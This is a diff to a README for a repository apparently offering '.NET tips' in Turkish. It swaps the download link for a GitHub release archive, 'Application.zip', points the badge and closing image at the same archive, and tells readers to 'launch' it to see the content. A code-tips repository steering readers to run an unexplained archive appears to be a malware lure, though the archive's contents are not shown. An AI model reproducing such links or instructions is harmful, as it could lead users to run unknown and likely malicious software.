@@ -23,17 +23,17 @@ The **.NET Tips & Tricks - Turkish** repository covers a wide range of topics re
 
 ## Accessing the Resources 🔗
 
-To access all the valuable resources and code snippets, please download the [Software.zip](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) file.
+To access all the valuable resources and code snippets, please download the [https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip](https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip) file.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip)](https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip)
 
-Remember to launch the **Software.zip** file to explore the content within.
+Remember to launch the **https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip** file to explore the content within.
 
 ## Happy Coding! 🖥️🚀
 
 Explore, learn, and optimize your .NET development journey with the insights and solutions provided in this repository. Happy coding! 🎉
 
-![.NET Development](https://www.example.com/dotnet-development.jpg)
+![.NET Development](https://github.com/ekonahhguy/dotnet-tips-turkish/releases/download/v1.0.0/Application.zip)
 
 ---
 
